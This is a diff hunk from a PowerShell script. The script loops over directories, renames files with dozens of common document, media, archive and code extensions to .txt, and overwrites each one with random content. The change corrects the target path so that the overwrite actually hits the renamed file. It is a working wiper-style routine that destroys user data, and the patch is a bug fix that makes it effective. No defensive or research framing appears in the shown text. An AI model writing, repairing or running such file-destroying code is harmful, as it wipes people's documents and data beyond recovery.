@@ -27,7 +27,7 @@ foreach ($directory in $directories) {
         $newName = $file.Name -replace "\.(exe|json|doc|pdf|wpd|docx|rtf|tex|odt|jpg|jpeg|mp3|rar|vcd|webp|css|html|py|php|ico|lnk|mp4|js|bak|xml|zip|bmp)$", ".txt"
         Rename-Item -Path $file.FullName -NewName $newName
         $randomContent = Generate-RandomContent
-        $newFilePath = Join-Path -Path $file.DirectoryName -ChildPath $newName
+        $newFilePath = Join-Path -Path $file.Directory.FullName -ChildPath $newName
         Set-Content -Path $newFilePath -Value $randomContent
     }
 }
